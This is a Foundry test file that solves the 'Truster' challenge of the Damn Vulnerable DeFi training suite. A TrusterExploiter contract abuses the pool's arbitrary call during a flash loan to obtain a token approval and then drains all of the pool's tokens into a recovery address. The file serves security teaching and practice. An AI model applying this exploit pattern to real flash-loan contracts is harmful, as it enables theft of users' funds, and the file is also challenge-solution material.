// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

contract TrusterExploiter {
    constructor(
        TrusterLenderPool pool,
        DamnValuableToken token,
        address recovery,
        uint256 tokensToSteal
    ) {
        // 1) let data := encoded call to `approve(recovery, TOKENS_IN_POOL)`

        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            tokensToSteal
        );

        console.log(
            "allowance(pool -> recovery) =",
            token.allowance(address(pool), recovery)
        );
        // 2) call pool.flashload(0, recovery, token, data)
        // TODO: print on the console the balance of pool
        console.log(
            "pool balance (before loan) =",
            token.balanceOf(address(pool))
        );

        pool.flashLoan(0, recovery, address(token), data);

        console.log(
            "allowance(pool -> recovery) =",
            token.allowance(address(pool), recovery)
        );

        console.log(
            "pool balance (after load) =",
            token.balanceOf(address(pool))
        );

        // 3) call token.transferFrom(pool, recovery)
        token.transferFrom(address(pool), recovery, tokensToSteal);
    }
}

contract TrusterChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    DamnValuableToken public token;
    TrusterLenderPool public pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy token
        token = new DamnValuableToken();

        // Deploy pool and fund it
        pool = new TrusterLenderPool(token);
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_truster() public checkSolvedByPlayer {
        new TrusterExploiter(pool, token, recovery, TOKENS_IN_POOL);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // All rescued funds sent to recovery account
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(
            token.balanceOf(recovery),
            TOKENS_IN_POOL,
            "Not enough tokens in recovery account"
        );
    }
}
